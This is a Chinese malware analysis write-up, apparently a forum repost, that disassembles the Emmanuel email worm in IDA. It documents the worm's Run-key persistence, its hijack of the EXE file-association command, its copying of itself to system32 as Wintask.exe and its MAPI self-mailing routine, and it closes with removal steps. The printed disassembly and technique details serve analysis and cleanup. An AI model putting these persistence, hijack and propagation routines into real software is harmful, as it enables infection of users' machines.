
# Emmanuel 病毒(以马内利病毒)分析

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-422.htm`](https://www.pediy.com/kssd/pediy09/pediy09-422.htm)

> \[工具\]：`PEID`，`IDA5.0`，`OD`

> \[病毒介绍\]：Emmanuel 病毒(以马内利病毒)与之前造成很多用户电脑执行档不能执行的 `Navidad` (圣诞节病毒)是同一个病毒作者所写,是一个通过 email 进行传播的网络蠕虫．

> 本人菜鸟一只，只是将自己的一些见解写出来，如果有分析的不对的地方或是有更好的方法还请高手指教．

> 工作开始：

> `PEID`查壳，显示为 `PECompact` `1.40` - `1.45` -> `Jeremy` `Collake`,我用`OD`手动脱壳修复就`OK`了．这一步就不写了．相信大家都会，如果不会手动脱壳的可以用一些脱壳机来弄．脱壳发现为用 `VC++`写的．

> 将脱壳后的文件载入 `IDA`.先查看其 `strings` 和 `imports`，发现有 `RegSetValueExA` 和 `MAPI`之类的字样．初步判断可能会更改注册表和进行邮件之类的操作．现在进入反汇编窗口，`CTRL` + `P`选择进入 `WinMain` 函数．(先了解个程序的大概然后再细化)

```asm
; int __stdcall WinMain(HINSTANCE hInstance,HINSTANCE
hPrevInstance,LPSTR lpCmdLine,int nShowCmd)
pec1:00401660 __stdcall WinMain(x, x, x, x) proc near ; CODE XREF:
start+C9p
pec1:00401660
pec1:00401660 Msg               = tagMSG ptr -1Ch
pec1:00401660 hInstance         = dword ptr  4
pec1:00401660 hPrevInstance     = dword ptr  8
pec1:00401660 lpCmdLine         = dword ptr  0Ch
pec1:00401660 nShowCmd          = dword ptr  10h
pec1:00401660
pec1:00401660                   sub     esp, 1Ch
pec1:00401663                   push    esi
pec1:00401664                   mov     esi, [esp+20h+hInstance] ;
pec1:00401668                   push    edi
pec1:00401669                   mov     edi, LoadStringA       ；装载窗口名称字符串
pec1:0040166F                   push    64h                   ; nBufferMax 100
pec1:00401671                   push    offset WindowName ; lpBuffer
pec1:00401676                   push    67h                   ; uID=103
pec1:00401678                   push    esi                   ; hInstance
pec1:00401679                   call    edi ; LoadStringA
pec1:0040167B                   push    64h                   ; nBufferMax
pec1:0040167D                   push    offset ClassName ; lpBuffer
pec1:00401682                   push    6Dh                   ; uID=109
pec1:00401684                   push    esi                   ; hInstance
pec1:00401685                   call    edi ; LoadStringA
pec1:00401687                   push    esi                   ; hInstance
pec1:00401688                   call    windowdlg     ; 注册一个窗口类，窗口的处理函数为 DlagFun
pec1:0040168D                   mov     eax, [esp+28h+nShowCmd]
pec1:00401691                   push    eax
pec1:00401692                   push    esi                   ; hInstance
pec1:00401693                   call    CreatWindow   ;创建窗口
pec1:00401698                   add     esp, 0Ch
pec1:0040169B                   test    eax, eax
pec1:0040169D                   jnz     short messagefun
pec1:0040169F                   pop     edi
pec1:004016A0                   pop     esi
pec1:004016A1                   add     esp, 1Ch
pec1:004016A4                   retn    10h
pec1:004016A7 ; ------------------------------------------------------
pec1:004016A7 messagefun:                           ; CODE XREF:
pec1:004016A7                   push    6Dh                   ; lpTableName
pec1:004016A9                   push    esi                   ; hInstance
pec1:004016AA                   call    LoadAcceleratorsA
pec1:004016B0                   mov     edi, GetMessageA
pec1:004016B6                   push    0                       ; wMsgFilterMax
pec1:004016B8                   push    0                       ; wMsgFilterMin
pec1:004016BA                   lea     ecx, [esp+2Ch+Msg]
pec1:004016BE                   push    0                       ; hWnd
pec1:004016C0                   push    ecx                   ; lpMsg
pec1:004016C1                   mov     esi, eax
pec1:004016C3                   call    edi ; GetMessageA
pec1:004016C5                   test    eax, eax
pec1:004016C7                   jz      short loc_40170D
pec1:004016C9                   push    ebx
pec1:004016CA                   mov     ebx, TranslateAccelerator
pec1:004016D0                   push    ebp
pec1:004016D1                   mov     ebp, TranslateMessage
pec1:004016D7 loc_4016D7:                        ; CODE XREF:
pec1:004016D7                   mov     eax, [esp+2Ch+Msg.hwnd]
pec1:004016DB                   lea     edx, [esp+2Ch+Msg]
pec1:004016DF                   push    edx
pec1:004016E0                   push    esi
pec1:004016E1                   push    eax
pec1:004016E2                   call    ebx ; TranslateAccelerator
pec1:004016E4                   test    eax, eax
pec1:004016E6                   jnz     short loc_4016FA
pec1:004016E8                   lea     ecx, [esp+2Ch+Msg]
pec1:004016EC                   push    ecx                   ; lpMsg
pec1:004016ED                   call    ebp ; TranslateMessage
pec1:004016EF                   lea     edx, [esp+2Ch+Msg]
pec1:004016F3                   push    edx                   ; lpMsg
pec1:004016F4                   call    DispatchMessageA
pec1:004016FA loc_4016FA:                        ; CODE XREF:
pec1:004016FA                   push    0                       ; wMsgFilterMax
pec1:004016FC                   push    0                       ; wMsgFilterMin
pec1:004016FE                   lea     eax, [esp+34h+Msg]
pec1:00401702                   push    0                       ; hWnd
pec1:00401704                   push    eax                   ; lpMsg
pec1:00401705                   call    edi ; GetMessageA
pec1:00401707                   test    eax, eax
pec1:00401709                   jnz     short loc_4016D7
pec1:0040170B                   pop     ebp
pec1:0040170C                   pop     ebx
pec1:0040170D loc_40170D:                        ; CODE XREF:
pec1:0040170D                   mov     eax, [esp+24h+Msg.wParam]
pec1:00401711                   pop     edi
pec1:00401712                   pop     esi
pec1:00401713                   add     esp, 1Ch
pec1:00401716                   retn    10h
pec1:00401716 __stdcall WinMain(x, x, x, x) endp
```

以上看出本程序的过程为注册一个窗口类，创建窗口，然后是消息循环，用`VC`写过程序的人应该很清楚这条线．

现在我们去看其创建窗口类的具体代码，

在 `pec1:00401688`  `call`  `windowdlg`  上双击进入具体的代码：

```asm
; int __cdecl windowdlg(HINSTANCE hInstance)
pec1:00401720 windowdlg       proc near                   ; CODE XREF:
pec1:00401720
pec1:00401720 var_30          = WNDCLASSEXA ptr -30h
pec1:00401720 hInstance         = dword ptr  4
pec1:00401720
pec1:00401720                   sub     esp, 30h
pec1:00401723                   mov     eax, [esp+30h+hInstance]
pec1:00401727                   push    esi
pec1:00401728                   mov     esi, LoadIconA
pec1:0040172E                   push    82h                   ; lpIconName
pec1:00401733                   push    eax                   ; hInstance
pec1:00401734                   mov     [esp+3Ch+var_30.cbSize], 30h
pec1:0040173C                   mov     [esp+3Ch+var_30.style], 3
pec1:00401744                   mov     [esp+3Ch+var_30.lpfnWndProc],
pec1:00401744                   offset DalgFun               ;窗口消息的处理函数
pec1:0040174C                   mov     [esp+3Ch+var_30.cbClsExtra], 0
pec1:00401754                   mov     [esp+3Ch+var_30.cbWndExtra], 0
```



```asm
pec1:0040175C         mov     [esp+3Ch+var_30.hInstance], eax
pec1:00401760         call    esi ; LoadIconA
pec1:00401762         push    7F00h         ; lpCursorName
pec1:00401767         push    0             ; hInstance
pec1:00401769         mov     [esp+3Ch+var_30.hIcon], eax
pec1:0040176D         call    LoadCursorA
pec1:00401773         mov     [esp+34h+var_30.hCursor], eax
pec1:00401777         mov     eax, [esp+34h+var_30.hInstance]
pec1:0040177B         push    82h           ; lpIconName
pec1:00401780         push    eax           ; hInstance
pec1:00401781         mov     [esp+3Ch+var_30.hbrBackground], 6
pec1:00401789         mov     [esp+3Ch+var_30.lpszMenuName], 0
pec1:00401791         mov     [esp+3Ch+var_30.lpszClassName],
                      offset ClassName
pec1:00401799         call    esi ; LoadIconA
pec1:0040179B         lea     ecx, [esp+34h+var_30]
pec1:0040179F         mov     [esp+34h+var_30.hIconSm], eax
pec1:004017A3         push    ecx           ; WNDCLASSEXA *
pec1:004017A4         call    RegisterClassExA
pec1:004017AA         pop     esi
pec1:004017AB         add     esp, 30h
pec1:004017AE         retn
pec1:004017AE         windowdlg     endp
```

从以上可以看到窗口消息的处理函数为 `DalgFun`，我们在
```asm
pec1:00401744         mov     [esp+3Ch+var_30.lpfnWndProc],
                      offset DalgFun
```
里的 `offset DalgFun` 里双击进入其消息处理函数的具体代码：

```c
int __stdcall DalgFun(HWND hWndParent, int Msg, WPARAM wParam, int Lparam)
```
```asm
pec1:004018C0 DalgFun     proc near        ; DATA XREF: windowdlg+24o
pec1:004018C0
pec1:004018C0 var_BC      = dword ptr -0BCh
pec1:004018C0 phkResult   = dword ptr -0B8h
pec1:004018C0 Rect        = tagRECT ptr -0B4h
pec1:004018C0 Paint       = PAINTSTRUCT ptr -0A4h
pec1:004018C0 String      = byte ptr -64h
pec1:004018C0 hWndParent  = dword ptr  4
pec1:004018C0 Msg         = dword ptr  8
pec1:004018C0 wParam      = dword ptr  0Ch
pec1:004018C0 Lparam      = dword ptr  10h
pec1:004018C0
pec1:004018C0             sub     esp, 0BCh
pec1:004018C6             mov     ecx, hInstance
pec1:004018CC             lea     eax, [esp+0BCh+String]
pec1:004018D0             push    ebx
pec1:004018D1             push    ebp
pec1:004018D2             push    esi
pec1:004018D3             push    edi
pec1:004018D4             push    64h         ; nBufferMax
pec1:004018D6             push    eax         ; lpBuffer
pec1:004018D7             push    6Ah         ; uID
pec1:004018D9             push    ecx         ; hInstance
pec1:004018DA             call    LoadStringA
pec1:004018E0             mov     ebp, [esp+0CCh+Lparam]
pec1:004018E7             mov     esi, [esp+0CCh+hWndParent]
pec1:004018EE             cmp     ebp, 201h     ; lparam 201h
pec1:004018F4             jnz     short loc_40191A
pec1:004018F4
pec1:004018F6             cmp     [esp+0CCh+wParam], 83h ; wparam 83h
pec1:00401901             jnz     short loc_40191A
pec1:00401901
pec1:00401903             mov     edx, hInstance
pec1:00401909             push    0             ; dwInitParam
pec1:0040190B             push    offset DialogFunc ; lpDialogFunc
pec1:00401910             push    esi           ; hWndParent
pec1:00401911             push    65h           ; lpTemplateName
pec1:00401913             push    edx           ; hInstance
pec1:00401914             call    DialogBoxParamA ; 创建一个模态对话框，处理函数为 DialogFunc
```

```
------------------------------------------------------------
```
```asm
pec1:00401953 loc_401953:                    ; CODE XREF: DalgFun+73j
pec1:00401953             mov     ebx, RegisterClipboardFormatA
pec1:00401959             push    offset szFormat ; "TaskbarCreated"
pec1:0040195E             call    ebx ; RegisterClipboardFormatA
pec1:00401960             push    offset s_Tclick ; "tclick"
pec1:00401965             mov     dword_4066F4, eax
pec1:0040196A             call    ebx ; RegisterClipboardFormatA
pec1:0040196C             mov     dword_4066F0, eax
pec1:00401971             lea     eax, [esp+0CCh+phkResult]
pec1:00401975             push    0             ; lpdwDisposition
pec1:00401977             push    eax           ; phkResult
pec1:00401978             push    0             ; lpSecurityAttributes
pec1:0040197A             push    20006h        ; samDesired
pec1:0040197F             push    0             ; dwOptions
pec1:00401981             push    0             ; lpClass
pec1:00401983             push    0             ; Reserved
pec1:00401985             push    offset s_SoftwareEmanu ; "SOFTWARE\Emanuel"
pec1:0040198A             push    80000001h     ; hKey
pec1:0040198F             call    RegCreateKeyExA ; 创建一个 HKEY_LOCAL_USER\SOFTWARE\Emanuel
pec1:00401995             lea     ecx, [esp+0CCh+var_BC]
pec1:00401999             push    ecx           ; int
pec1:0040199A             push    offset s_Dulce? ; "Dulce?"
pec1:0040199F             push    offset s_SoftwareEmanu ; "SOFTWARE\Emanuel"
pec1:004019A4             call    sub_401840
pec1:004019A4
pec1:004019A9             mov     edx, [esp+0D8h+var_BC]
pec1:004019AD             add     esp, 0Ch
pec1:004019B0             push    offset s_No    ; "no"
pec1:004019B5             push    edx
pec1:004019B6             call    lstrcmpi
pec1:004019BC             test    eax, eax
pec1:004019BE             jz      short loc_4019D1
pec1:004019BE
pec1:004019C0             push    0             ; uType
pec1:004019C2             push    0             ; lpCaption
pec1:004019C4             push    offset Text    ; ":)"
pec1:004019C9             push    0             ; hWnd
pec1:004019CB             call    MessageBoxA ; 弹出一个消息框显示 :)
pec1:004019CB
pec1:004019D1
```

```
------------------------------------------------------------
```
```asm
pec1:00401ABA                            ; 
pec1:00401AC0             pop     edi
pec1:00401AC1             pop     esi
pec1:00401AC2             pop     ebp
pec1:00401AC3             xor     eax, eax
pec1:00401AC5             pop     ebx
pec1:00401AC6             add     esp, 0BCh
pec1:00401ACC             retn    10h
pec1:00401ACC
pec1:00401ACC DalgFun     endp
```

从上面我们可以看到该主窗口类消息处理函数主要完成创建一个对话框，然后写注册表创建一个新项为 `HKEY_LOCAL_USER\SOFTWARE\Emanuel`，同时显示一个消息窗口为 `:)`

现在我们进入 `DialogFunc` 的处理消息代码看看具体是什么东西：
```c
BOOL __stdcall DialogFunc(HWND, UINT, WPARAM, LPARAM)
```
```asm
pec1:00401B10 DialogFunc  proc near        ; DATA XREF: DalgFun+4Bo
pec1:00401B10
pec1:00401B10 hDlg        = dword ptr  4
pec1:00401B10 arg_4       = dword ptr  8
pec1:00401B10 arg_8       = dword ptr  0Ch
pec1:00401B10
pec1:00401B10             mov     eax, [esp+arg_4]
pec1:00401B14             sub     eax, 110h
```



# DialogFunc 函数分析

## 反汇编代码

```
pec1:00401B19              jz      short loc_401B83
pec1:00401B19
pec1:00401B1B              dec     eax
pec1:00401B1C              jnz     short loc_401B50
pec1:00401B1C
pec1:00401B1E              mov     eax, [esp+arg_8]
pec1:00401B22              cmp     eax, 3E8h
pec1:00401B27              jnz     short loc_401B55
pec1:00401B27
pec1:00401B29              push    1010h           ; uType
pec1:00401B2E              push    offset Caption  ; "Emmanuel....."
pec1:00401B33              push    offset s_Emmanuel-godI ; "Emmanuel-God is with us!May god bless u"...
pec1:00401B38              push    0               ; hWnd
pec1:00401B3A              call    MessageBoxA     ; 显示一个 Emmanuel-God is with us!May god bless u 的消息框
pec1:00401B40              push    3E8h            ; nResult
pec1:00401B45              mov     eax, [esp+4+hDlg]
pec1:00401B49              push    eax             ; hDlg
pec1:00401B4A              call    EndDialog
pec1:00401B4A
pec1:00401B50
pec1:00401B50 loc_401B50: ; CODE XREF:
                          ;
                          ; DialogFunc+Cj
pec1:00401B50              ;
pec1:00401B50              ;
pec1:00401B50              ; DialogFunc+48j
pec1:00401B50              xor     eax, eax
pec1:00401B52              retn    10h
pec1:00401B52
pec1:00401B55 ;
pec1:00401B55 ; ---------------------------------------------------------------------------
pec1:00401B55
pec1:00401B55 loc_401B55: ; CODE XREF:
                          ;
                          ; DialogFunc+17j
pec1:00401B55              cmp     eax, 2
pec1:00401B58              jnz     short loc_401B50
pec1:00401B58
pec1:00401B5A              push    0               ; uType
pec1:00401B5C              push    offset Caption  ; "Emmanuel....."
pec1:00401B61              push    offset s_MayGodBlessUD ; "May GOd bless u;D"
pec1:00401B66              push    0               ; hWnd
pec1:00401B68              call    MessageBoxA     ; 显示 May GOd bless u;D
pec1:00401B6E              push    2               ; nResult
pec1:00401B70              mov     ecx, [esp+4+hDlg]
pec1:00401B74              push    ecx             ; hDlg
pec1:00401B75              call    EndDialog
pec1:00401B7B              push    0               ; uExitCode
pec1:00401B7D              call    ExitProcess
pec1:00401B7D
pec1:00401B83
pec1:00401B83 loc_401B83: ; CODE XREF:
                          ;
                          ; DialogFunc+9j
pec1:00401B83              mov     eax, 1
pec1:00401B88              retn    10h
pec1:00401B88
pec1:00401B88 DialogFunc    endp
```

从上面可以看出该函数主要是显示一个消息框，至于显示哪一个则是根据 `LPARAM` 来进行判断。也即上面的模态窗口的处理函数主要是为了显示一个消息：`Emmanuel-God is with us!May god bless u` 或 `May GOd bless u`。

## CreatWindow 函数

至此窗口类的注册部分我们算是基本完毕了。现在进入创建窗口部分。重新返回 `WINMAIN`

```
pec1:00401693              call    CreatWindow    ; 在双击
```

```
pec1:004017B0 ; int __cdecl CreatWindow(HINSTANCE hInstance)
pec1:004017B0 CreatWindow   proc near           ; CODE XREF:
                          ;
                          ; WinMain(x,x,x,x)+33p
pec1:004017B0
pec1:004017B0 hInstance     = dword ptr  4
pec1:004017B0
pec1:004017B0              mov     eax, [esp+hInstance]
pec1:004017B4              push    0               ; lpParam
pec1:004017B6              push    eax             ; hInstance
pec1:004017B7              push    0               ; hMenu
pec1:004017B9              push    0               ; hWndParent
pec1:004017BB              push    0               ; nHeight
pec1:004017BD              push    80000000h       ; nWidth
pec1:004017C2              push    0               ; Y
pec1:004017C4              push    80000000h       ; X
pec1:004017C9              push    0CF0000h        ; dwStyle
pec1:004017CE              push    offset WindowName ; lpWindowName
pec1:004017D3              push    offset ClassName ; lpClassName
pec1:004017D8              push    0               ; dwExStyle
pec1:004017DA              mov     hInstance, eax
pec1:004017DF              call    CreateWindowExA   ; 创建窗口
pec1:004017E5              test    eax, eax
pec1:004017E7              jnz     short loc_4017EA
pec1:004017E7
pec1:004017E9              retn
pec1:004017E9
pec1:004017EA ; -----------------------------------------------------
pec1:004017EA
pec1:004017EA loc_4017EA: ; CODE XREF:
                          ;
                          ; CreatWindow+37j
pec1:004017EA              push    eax             ; hWnd
pec1:004017EB              mov     dword_4066F8, eax
pec1:004017F0              call    UpdateWindow
pec1:004017F6              call    RegSetRun       ; 进行注册表操作
pec1:004017F6
pec1:004017FB              call    CopyFile        ; 释放文件
pec1:004017FB
pec1:00401800              call    ModExeMod       ; 修改ＥＸＥ文件的打开方式
pec1:00401800
pec1:00401805              call    Mail            ; 发送邮件
pec1:00401805
pec1:0040180A              mov     eax, hInstance
pec1:0040180F              push    83h             ; lpIconName
pec1:00401814              push    eax             ; hInstance
pec1:00401815              call    LoadIconA
pec1:0040181B              mov     ecx, dword_4066F8
pec1:00401821              push    offset s_ComeOnLetsPar ; "Come on lets party!!!"
pec1:00401826              push    eax
pec1:00401827              push    83h
pec1:0040182C              push    ecx
pec1:0040182D              call    tasknotify      ; 在任务栏添加一个小图标，把鼠标放上去时显示 Come on lets party!!!
pec1:0040182D
pec1:00401832              add     esp, 10h
pec1:00401835              mov     eax, 1
pec1:0040183A              retn
pec1:0040183A
pec1:0040183A CreatWindow   endp
pec1:0040183A
```

上面的注释已经很清楚，这里我就不总结了，现在进入注册表的操作部分，看看它都对注册表进行了哪些操作：

## RegSetRun 函数

```
RegSetRun       proc near           ; CODE XREF: CreatWindow+46p
pec1:00401590
pec1:00401590 hKey            = dword ptr -4
pec1:00401590
pec1:00401590              push    ecx
pec1:00401591              push    esi
pec1:00401592              lea     eax, [esp+8+hKey]
pec1:00401596              push    0               ;
                          ;
                          ; lpdwDisposition
pec1:00401598              push    eax             ; phkResult
pec1:00401599              push    0               ;
                          ;
                          ; lpSecurityAttributes
pec1:0040159B              push    20006h          ; samDesired
pec1:004015A0              push    0               ; dwOptions
pec1:004015A2              push    0               ; lpClass
pec1:004015A4              push    0               ; Reserved
pec1:004015A6              push    offset s_SoftwareMic_0 ;
                          ;
                          ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
pec1:004015AB              push    80000002h       ; hKey
pec1:004015B0              call    RegCreateKeyExA
pec1:004015B6              push    104h
pec1:004015BB              call    operator new(uint)
pec1:004015BB
pec1:004015C0              add     esp, 4
pec1:004015C3              mov     esi, eax
pec1:004015C5              push    104h            ; uSize
pec1:004015CA              push    esi             ; lpBuffer
pec1:004015CB              call    GetSystemDirectoryA
pec1:004015D1              push    offset s_Wintask_exe ;
                          ;
                          ; "\\Wintask.exe"
```



```asm
pec1:004015D6                 push    esi
pec1:004015D7                 call    lstrcat
pec1:004015DD                 push    esi
pec1:004015DE                 call    lstrlen
pec1:004015E4                 mov     ecx, [esp+8+hKey]
pec1:004015E8                 push    eax             ; cbData
pec1:004015E9                 push    esi             ; lpData
pec1:004015EA                 push    1               ; dwType
pec1:004015EC                 push    0               ; Reserved
pec1:004015EE                 push    offset s_Win32baseserv ;

"Win32BaseServiceMOD"
pec1:004015F3                 push    ecx             ; hKey
pec1:004015F4                 call    RegSetValueExA  ;
pec1:004015FA                 pop     esi
pec1:004015FB                 pop     ecx
pec1:004015FC                 retn
pec1:004015FC
pec1:004015FC RegSetRun       endp
```

其实就是在 `hkey_local_mochine\SOFTWARE\Microsoft\Windows\CurrentVersi\run` 下创建一个值项 `Win32BaseServiceMOD`，该值为 `%system32\Wintask.exe`

好现在看 `pec1:004017FB call CopyFile ;释放文件`

里的具体实现:

```asm
CopyFile        proc near               ; CODE XREF: CreatWindow+4Bp

pec1:00401600                 push    esi
pec1:00401601                 push    edi
pec1:00401602                 push    104h
pec1:00401607                 call    operator new(uint)
pec1:00401607

pec1:0040160C                 push    104h
pec1:00401611                 call    operator new(uint)
pec1:00401611

pec1:00401616                 push    104h
pec1:0040161B                 mov     edi, eax
pec1:0040161D                 call    operator new(uint)
pec1:0040161D

pec1:00401622                 add     esp, 0Ch
pec1:00401625                 mov     esi, eax
pec1:00401627                 push    104h            ; nSize
pec1:0040162C                 push    edi             ; lpFilename
pec1:0040162D                 push    0               ; hModule
pec1:0040162F                 call    GetModuleFileNameA
pec1:00401635                 push    104h            ; uSize
pec1:0040163A                 push    esi             ; lpBuffer
pec1:0040163B                 call    GetSystemDirectoryA   ;得到系统目录
pec1:00401641                 push    offset s_Wintask_exe_0 ;

"\\Wintask.exe"
pec1:00401646                 push    esi
pec1:00401647                 call    lstrcat
pec1:0040164D                 push    1               ; bFailIfExists
pec1:0040164F                 push    esi             ; lpNewFileName
pec1:00401650                 push    edi             ;

lpExistingFileName
pec1:00401651                 call    CopyFileA
pec1:00401657                 pop     edi
pec1:00401658                 pop     esi
pec1:00401659                 retn
pec1:00401659
pec1:00401659 CopyFile        endp
```

以上就是在系统目录即 `system32` 下释放 `Wintask.exe` 文件

现在进入查看 `pec1:00401800 call ModExeMod` 的具体操作

```asm
ModExeMod       proc near               ; CODE XREF: CreatWindow+50p

pec1:00401510

pec1:00401510 hKey            = dword ptr -4
pec1:00401510

pec1:00401510                 push    ecx
pec1:00401511                 push    esi
pec1:00401512                 push    edi
pec1:00401513                 lea     eax, [esp+0Ch+hKey]
pec1:00401517                 push    0               ;

lpdwDisposition
pec1:00401519                 push    eax             ; phkResult
pec1:0040151A                 push    0               ;

lpSecurityAttributes
pec1:0040151C                 push    20006h          ; samDesired
pec1:00401521                 push    0               ; dwOptions
pec1:00401523                 push    0               ; lpClass
pec1:00401525                 push    0               ; Reserved
pec1:00401527                 push    offset s_ExefileShellO ;

"exefile\\shell\\open\\command"
pec1:0040152C                 push    80000000h       ; hKey
pec1:00401531                 call    RegCreateKeyExA
pec1:00401537                 push    104h
pec1:0040153C                 call    operator new(uint)
pec1:0040153C

pec1:00401541                 add     esp, 4
pec1:00401544                 mov     esi, eax
pec1:00401546                 push    104h            ; uSize
pec1:0040154B                 push    esi             ; lpBuffer
pec1:0040154C                 call    GetSystemDirectoryA
pec1:00401552                 mov     edi, lstrcat
pec1:00401558                 push    offset s_Wintask_exe ;

"\\Wintask.exe"
pec1:0040155D                 push    esi
pec1:0040155E                 call    edi ; lstrcat
pec1:00401560                 push    offset s_1      ; " \\"%1\\" %\*"
pec1:00401565                 push    esi
pec1:00401566                 call    edi ; lstrcat
pec1:00401568                 push    esi
pec1:00401569                 call    lstrlen
pec1:0040156F                 mov     ecx, [esp+0Ch+hKey]
pec1:00401573                 push    eax             ; cbData
pec1:00401574                 push    esi             ; lpData
pec1:00401575                 push    1               ; dwType
pec1:00401577                 push    0               ; Reserved
pec1:00401579                 push    offset byte_406824 ; lpValueName
pec1:0040157E                 push    ecx             ; hKey
pec1:0040157F                 call    RegSetValueExA
pec1:00401585                 pop     edi
pec1:00401586                 pop     esi
pec1:00401587                 pop     ecx
pec1:00401588                 retn
pec1:00401588
pec1:00401588 ModExeMod       endp
```

以上就是修改 `HKEY_CLASS_ROOT\exefile\shell\open\command` 为 `%32\Wintask.exe \\"%1\\" %\*` 从而达到只要运行 EXE 文件就是打开 `Wintask.exe` 即病毒文件。

下面进入 `pec1:00401805 call Mail` 查看发送邮件的部分:

```asm
Mail            proc near               ; CODE XREF: CreatWindow+55p

pec1:00401450

pec1:00401450 var_44C           = dword ptr -44Ch
pec1:00401450 var_438           = dword ptr -438h
pec1:00401450 var_420           = dword ptr -420h
pec1:00401450 var_41C           = dword ptr -41Ch
pec1:00401450 var_400           = dword ptr -400h
pec1:00401450 var_24C           = dword ptr -24Ch
pec1:00401450

pec1:00401450 ; FUNCTION CHUNK AT pec1:00401280 SIZE 000001D0 BYTES
pec1:00401450

pec1:00401450                 call    sub_401250    ;初始化建立发送邮件的环境
pec1:00401450

pec1:00401455                 jmp     loc_401280    ；发送邮件
pec1:00401455
pec1:00401455 Mail            endp
```

先是 CALL 一个函数然后跳到一个地址。

现在进入查看第一个 CALL 的操作，里面就是设用 `MAPI32.dll` 里的各个函数来进行操作，发送邮件的内容为空，附件为:`Emanuel.exe`

```asm
pec1:004013BE                 mov     ecx, [esp+450h+var_438]
pec1:004013C2                 mov     edi, offset s_Emanuel_exe ; "Emanuel.exe"
```

写的太累了，有兴趣的朋友自己分析吧．病毒文件在网上应该能搜到下载的．我是从黑白网络下下来的．

### 总结
该病毒进行的操作如下：

1. 在任务栏添加一个小图标，显示 `Come on lets party!!!`
2. 注册表创建一个新项为 `HKEY_LOCAL_USER\SOFTWARE\Emanuel`，同时显示一个消息窗口为 `:)` 并创建一个模态窗口．
3. 如果该窗口被按下则显示 `Emmanuel-God is with us!May god bless u`，如果被关闭则显示 `May GOd bless u`．
4. 修改启动项:`hkey_local_mochine\SOFTWARE\Microsoft\Windows\CurrentVersi\run` 下创建一个值项 `Win32BaseServiceMOD`，该值为 `%system32\Wintask.exe`
5. 在系统目录即 `system32` 下释放 `Wintask.exe` 文件
6. 修改 `HKEY_CLASS_ROOT\exefile\shell\open\command` 为 `%32\Wintask.exe \\"%1\\" %\*` 从而达到只要运行 EXE 文件就是打开 `Wintask.exe` 即病毒文件。
7. 搜索用户机器里的邮件地址给各邮件地址发邮件，附件为:`Emanuel.exe`

### 解决方案



1. 下载瑞星的注册表修复软件，将`EXE`的打开方式修改回系统默认的。

2. 删除注册表里的启动项`Win32BaseServiceMOD`

3. 在任务管理器里结束`Wintask`的进程，然后删除病毒文件`Wintask.exe`，位置在`system32`下

4. 删除`HKEY_LOCAL_USER\SOFTWARE\Emanuel`

\[结语\]：写这篇东西累死了。也不知道是否表述清楚，如果有不对的地方还请高手多多指点。

```
4dd466d0e1e0cc123afbe504da2462ca
```
